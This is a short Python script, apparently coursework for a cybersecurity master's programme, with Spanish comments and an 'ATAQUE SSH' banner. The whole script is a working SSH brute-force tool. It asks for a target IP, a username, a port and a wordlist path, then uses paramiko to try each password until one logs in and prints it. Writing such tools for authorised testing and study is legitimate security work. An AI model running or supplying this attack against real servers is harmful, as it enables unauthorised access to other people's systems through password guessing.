#!/usr/bin/env python
# -*- coding: utf-8 -*-

print("\n |-------------------------------------------------------------------|")
print("|                  ATAQUE SSH NUEVA EDICION 2021                       |")
print("|               Editor: Sebastian Piedrahita Perez                     |")
print("|                   Master en Ciberseguridad                           |")
print("|                tutor: Profesor Francisco Sanz                        |")
print("|----------------------------------------------------------------------|")

import paramiko
import socket


"""
Definimos la funcion para el ataque por fuerza bruta
"""
def ataque_bruteforce(victima,usuario,puerto,diccionario):

    #Leemos el diccionario con las contraseñas que iremos probando
    try:
        dic = open(diccionario, "r")
        words = dic.readlines()
        for contrasenia in words:
            contrasenia = contrasenia.strip()
            #Establecemos la conexion con SSH
            conexion_ssh = paramiko.SSHClient()
            #Añadimos la clave en caso de que sea la primera conexion (siempre es necesaria)
            conexion_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                conexion_ssh.connect(victima,puerto,usuario,contrasenia)
                print("[+] Contraseña encontrada: %s" %contrasenia)
                break
            #No funciona la contraseña que hemos probado
            except paramiko.AuthenticationException:
                print("[-] Contraeña erronea: %s" %contrasenia)

            #Excepcion en caso de que no haya conexion
            except socket.error:
                print("[-] Fallo al establecer la conexión")
                break

        conexion_ssh.close()
    except IOError:
        print("[-] %s diccionario no encontrado " %diccionario)

def main():

    victima = input("Introduca la direccion ip del objetivo: ")
    usuario = input("introdusca el nombre del usuario: ")
    puerto = int(input("Introdusca el puerto que desea utilizar: "))
    diccionario = input("Introduca el path del diccionario: ")

    ataque_bruteforce(victima,usuario,puerto,diccionario)

"""
Programa principal
"""
if __name__ == "__main__":
    main()
